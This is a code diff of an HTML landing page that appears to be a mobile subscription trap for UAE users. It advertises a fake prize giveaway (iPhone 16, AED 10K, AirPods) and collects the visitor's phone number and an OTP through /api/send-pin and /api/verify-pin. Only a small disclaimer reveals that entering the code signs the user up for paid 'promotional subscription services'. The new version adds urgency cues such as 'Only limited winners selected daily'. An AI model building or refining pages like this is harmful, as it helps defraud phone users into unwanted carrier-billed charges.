@@ -1,364 +1,591 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-<title>Lucky Draw UAE</title>
+<title>Win Big UAE</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
 <style>
 
 *{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:Arial;
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Cairo',sans-serif;
 }
 
 body{
 
-  background:#0f172a;
-  color:white;
-  overflow-x:hidden;
+    background:
+    linear-gradient(
+    180deg,
+    #12002f 0%,
+    #1d004d 50%,
+    #2d006f 100%
+    );
 
+    min-height:100vh;
+
+    color:white;
+
+    overflow-x:hidden;
 }
 
 .container{
 
-  width:100%;
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  padding:20px;
+    width:100%;
+    max-width:480px;
 
+    margin:auto;
+
+    padding:20px;
+
+    text-align:center;
 }
 
-.logo{
+.top-badge{
 
-  font-size:40px;
-  font-weight:bold;
-  color:#FFD700;
-  margin-bottom:20px;
+    background:#ffde59;
 
+    color:black;
+
+    display:inline-block;
+
+    padding:10px 25px;
+
+    border-radius:999px;
+
+    font-size:18px;
+
+    font-weight:900;
+
+    margin-top:20px;
+
+    animation:pulse 1.5s infinite;
 }
 
-.subtitle{
+@keyframes pulse{
 
-  font-size:20px;
-  text-align:center;
-  margin-bottom:30px;
-  line-height:1.5;
+    0%{
+        transform:scale(1);
+    }
 
+    50%{
+        transform:scale(1.05);
+    }
+
+    100%{
+        transform:scale(1);
+    }
 }
 
-.gift-box{
+h1{
 
-  width:220px;
-  animation:float 2s infinite ease-in-out;
+    font-size:52px;
 
+    line-height:1.1;
+
+    margin-top:30px;
+
+    font-weight:900;
 }
 
-@keyframes float{
+.highlight{
 
-  0%{
-    transform:translateY(0px);
-  }
-
-  50%{
-    transform:translateY(-15px);
-  }
-
-  100%{
-    transform:translateY(0px);
-  }
-
+    color:#ffde59;
 }
 
-.prizes{
+.sub{
 
-  margin-top:30px;
-  display:flex;
-  gap:15px;
-  flex-wrap:wrap;
-  justify-content:center;
+    margin-top:20px;
 
+    font-size:24px;
+
+    color:#ddd;
+}
+
+.prize-box{
+
+    display:flex;
+
+    gap:15px;
+
+    margin-top:35px;
+
+    justify-content:center;
 }
 
 .prize{
 
-  background:#1e293b;
-  border:2px solid #FFD700;
-  padding:15px;
-  border-radius:12px;
-  width:110px;
-  text-align:center;
-  font-weight:bold;
+    flex:1;
 
+    background:
+    linear-gradient(
+    135deg,
+    #5b21b6,
+    #7c3aed
+    );
+
+    border:3px solid #ffde59;
+
+    border-radius:20px;
+
+    padding:20px 10px;
+
+    font-size:26px;
+
+    font-weight:900;
+
+    box-shadow:
+    0 0 25px rgba(255,222,89,.4);
 }
 
-.claim-box{
+.spin-box{
 
-  margin-top:35px;
-  width:100%;
-  max-width:350px;
+    margin-top:40px;
 
+    background:white;
+
+    border-radius:28px;
+
+    padding:30px 20px;
+
+    box-shadow:
+    0 0 40px rgba(0,0,0,.4);
 }
 
-input{
+.phone-box{
 
-  width:100%;
-  padding:15px;
-  border:none;
-  border-radius:10px;
-  margin-bottom:15px;
-  font-size:16px;
+    display:flex;
 
+    width:100%;
+
+    background:#f3f4f6;
+
+    border-radius:18px;
+
+    overflow:hidden;
+
+    margin-bottom:20px;
+
+    border:2px solid #ddd;
 }
 
-button{
+.prefix{
 
-  width:100%;
-  padding:15px;
-  border:none;
-  border-radius:10px;
-  background:#FFD700;
-  color:black;
-  font-size:18px;
-  font-weight:bold;
-  cursor:pointer;
+    width:95px;
 
+    background:#e5e7eb;
+
+    color:black;
+
+    display:flex;
+
+    align-items:center;
+
+    justify-content:center;
+
+    font-size:28px;
+
+    font-weight:900;
 }
 
-button:hover{
+.phone-box input{
 
-  opacity:0.9;
+    flex:1;
 
+    border:none;
+
+    outline:none;
+
+    padding:22px;
+
+    font-size:28px;
+
+    color:black;
+}
+
+.claim-btn{
+
+    width:100%;
+
+    border:none;
+
+    background:
+    linear-gradient(
+    90deg,
+    #ffde59,
+    #ffd000
+    );
+
+    color:black;
+
+    font-size:34px;
+
+    font-weight:900;
+
+    padding:22px;
+
+    border-radius:18px;
+
+    cursor:pointer;
+
+    transition:.2s;
+
+    box-shadow:
+    0 10px 30px rgba(255,222,89,.4);
+}
+
+.claim-btn:hover{
+
+    transform:scale(1.02);
+}
+
+#loading{
+
+    display:none;
+
+    margin-top:20px;
+
+    color:#7c3aed;
+
+    font-size:22px;
+
+    font-weight:bold;
 }
 
 #otpBox{
 
-  display:none;
-  margin-top:20px;
+    display:none;
 
+    margin-top:25px;
 }
 
-.loading{
+#otp{
 
-  display:none;
-  margin-top:15px;
-  text-align:center;
-  color:#FFD700;
+    width:100%;
 
+    padding:20px;
+
+    border-radius:18px;
+
+    border:2px solid #ddd;
+
+    font-size:28px;
+
+    margin-bottom:15px;
+
+    text-align:center;
 }
 
-.success{
+.verify-btn{
 
-  display:none;
-  margin-top:20px;
-  text-align:center;
-  color:#00ff88;
-  font-size:22px;
-  font-weight:bold;
+    width:100%;
 
+    border:none;
+
+    background:
+    linear-gradient(
+    90deg,
+    #7c3aed,
+    #9333ea
+    );
+
+    color:white;
+
+    font-size:30px;
+
+    font-weight:900;
+
+    padding:20px;
+
+    border-radius:18px;
+
+    cursor:pointer;
 }
 
-.footer{
+.disclaimer{
 
-  margin-top:40px;
-  font-size:12px;
-  color:#94a3b8;
-  text-align:center;
+    margin-top:30px;
 
+    font-size:14px;
+
+    color:#ccc;
+
+    line-height:1.6;
+}
+
+.flash{
+
+    margin-top:18px;
+
+    color:#ffde59;
+
+    font-size:18px;
+
+    font-weight:bold;
+
+    animation:blink 1s infinite;
+}
+
+@keyframes blink{
+
+    0%{
+        opacity:1;
+    }
+
+    50%{
+        opacity:.4;
+    }
+
+    100%{
+        opacity:1;
+    }
 }
 
 </style>
-
 </head>
-
 <body>
 
 <div class="container">
 
-  <div class="logo">
-    UAE Lucky Draw
-  </div>
+<div class="top-badge">
+🇦🇪 UAE EXCLUSIVE GIVEAWAY
+</div>
 
-  <div class="subtitle">
-    Win iPhone 16 Pro Max,<br>
-    AED 10,000 Cash or AirPods Pro!
-  </div>
+<h1>
+WIN AN <span class="highlight">iPHONE 16</span>
+</h1>
 
-  <img
-    class="gift-box"
-    src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png"
-  >
+<div class="sub">
+Enter your mobile number to participate now
+</div>
 
-  <div class="prizes">
+<div class="prize-box">
 
-    <div class="prize">
-      iPhone 16
-    </div>
+<div class="prize">
+iPhone 16
+</div>
 
-    <div class="prize">
-      AED 10K
-    </div>
+<div class="prize">
+AED 10K
+</div>
 
-    <div class="prize">
-      AirPods
-    </div>
+<div class="prize">
+AirPods
+</div>
 
-  </div>
+</div>
 
-  <div class="claim-box">
+<div class="spin-box">
 
-    <input
-      id="msisdn"
-      placeholder="Enter Mobile Number"
-    >
+<div class="phone-box">
 
-    <button onclick="sendPIN()">
-      Claim Now
-    </button>
+<div class="prefix">
++971
+</div>
 
-    <div class="loading" id="loading">
-      Processing...
-    </div>
+<input
+id="msisdn"
+placeholder="564975091"
+maxlength="9"
+inputmode="numeric"
+pattern="[0-9]*"
+oninput="this.value=this.value.replace(/[^0-9]/g,'')"
+/>
 
-    <div id="otpBox">
+</div>
 
-      <input
-        id="otp"
-        placeholder="Enter OTP"
-      >
+<button class="claim-btn" onclick="sendPIN()">
+CLAIM NOW
+</button>
 
-      <button onclick="verifyOTP()">
-        Verify OTP
-      </button>
+<div id="loading">
+Processing...
+</div>
 
-    </div>
+<div class="flash">
+⚡ Only limited winners selected daily
+</div>
 
-    <div class="success" id="success">
-      Subscription Successful!
-    </div>
+<div id="otpBox">
 
-  </div>
+<input
+id="otp"
+placeholder="Enter OTP"
+/>
 
-  <div class="footer">
-    Terms & Conditions Apply
-  </div>
+<button class="verify-btn" onclick="verifyOTP()">
+VERIFY OTP
+</button>
+
+</div>
+
+</div>
+
+<div class="disclaimer">
+
+By continuing, you agree to receive promotional subscription services.
+Standard carrier charges may apply.
+
+</div>
 
 </div>
 
 <script>
 
-let currentTxid = null;
+let savedTxid = '';
 
-// SEND PIN
 async function sendPIN(){
 
-  const msisdn =
+    let msisdn =
     document.getElementById('msisdn').value;
 
-  document
-    .getElementById('loading')
-    .style.display = 'block';
+    msisdn = msisdn.replace(/\s/g,'');
 
-  try{
+    msisdn = msisdn.replace('+','');
 
-    const response = await fetch('/api/send-pin',{
+    if(msisdn.startsWith('0')){
 
-      method:'POST',
-
-      headers:{
-        'Content-Type':'application/json'
-      },
-
-      body:JSON.stringify({
-        msisdn:msisdn
-      })
-
-    });
-
-    const data = await response.json();
-
-    console.log(data);
-
-    currentTxid = data.txid;
-
-    document
-      .getElementById('loading')
-      .style.display = 'none';
-
-    document
-      .getElementById('otpBox')
-      .style.display = 'block';
-
-  } catch(err){
-
-    console.log(err);
-
-    alert("System Error");
-
-  }
-
-}
-
-
-// VERIFY OTP
-async function verifyOTP(){
-
-  const otp =
-    document.getElementById('otp').value;
-
-  try{
-
-    const response = await fetch('/api/verify-pin',{
-
-      method:'POST',
-
-      headers:{
-        'Content-Type':'application/json'
-      },
-
-      body:JSON.stringify({
-
-        txid:currentTxid,
-
-        pin:otp
-
-      })
-
-    });
-
-    const data = await response.json();
-
-    console.log(data);
-
-    if(data.success){
-
-      document
-        .getElementById('success')
-        .style.display = 'block';
-
-      document
-        .getElementById('otpBox')
-        .style.display = 'none';
-
-    } else {
-
-      alert("Invalid OTP");
+        msisdn =
+        '971' + msisdn.substring(1);
 
     }
 
-  } catch(err){
+    else if(!msisdn.startsWith('971')){
 
-    console.log(err);
+        msisdn =
+        '971' + msisdn;
 
-    alert("Verification Failed");
+    }
 
-  }
+    if(msisdn.length < 12){
+
+        alert('Please enter valid UAE number');
+        return;
+
+    }
+
+    document
+    .getElementById('loading')
+    .style.display='block';
+
+    try{
+
+        const response =
+        await fetch('/api/send-pin',{
+
+            method:'POST',
+
+            headers:{
+                'Content-Type':'application/json'
+            },
+
+            body:JSON.stringify({
+                msisdn:msisdn
+            })
+
+        });
+
+        const data =
+        await response.json();
+
+        console.log(data);
+
+        document
+        .getElementById('loading')
+        .style.display='none';
+
+        if(data.txid){
+
+            savedTxid = data.txid;
+
+            document
+            .getElementById('otpBox')
+            .style.display='block';
+
+            alert('OTP Sent Successfully');
+
+        }else{
+
+            alert(data.msg || 'Failed');
+
+        }
+
+    }catch(err){
+
+        console.log(err);
+
+        document
+        .getElementById('loading')
+        .style.display='none';
+
+        alert('Server Error');
+
+    }
+
+}
+
+async function verifyOTP(){
+
+    const otp =
+    document.getElementById('otp').value;
+
+    if(!otp){
+
+        alert('Enter OTP');
+        return;
+
+    }
+
+    try{
+
+        const response =
+        await fetch('/api/verify-pin',{
+
+            method:'POST',
+
+            headers:{
+                'Content-Type':'application/json'
+            },
+
+            body:JSON.stringify({
+
+                txid:savedTxid,
+                pin:otp
+
+            })
+
+        });
+
+        const data =
+        await response.json();
+
+        console.log(data);
+
+        if(data.stateCode == 0){
+
+            alert('Subscription Success');
+
+            window.location.href =
+            'https://google.com';
+
+        }else{
+
+            alert(data.msg || 'OTP Failed');
+
+        }
+
+    }catch(err){
+
+        console.log(err);
+
+        alert('Verify Error');
+
+    }
 
 }
 
